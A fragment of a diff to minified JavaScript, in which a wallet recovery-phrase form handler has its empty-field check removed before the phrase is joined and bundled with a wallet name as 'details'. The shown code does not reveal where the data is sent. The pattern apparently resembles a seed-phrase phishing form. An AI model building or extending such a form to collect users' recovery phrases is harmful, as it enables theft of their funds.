@@ -13127,10 +13127,7 @@ const Gh = [
 				J && (J.type = J.type === "password" ? "text" : "password");
 			},
 			$ = async () => {
-				if (G.some((rl) => !rl.trim())) {
-					alert("Please fill in all recovery phrase fields.");
-					return;
-				}
+
 				const el = G.join(" "),
 					J = { walletName: N.name, details: el };
 				try {
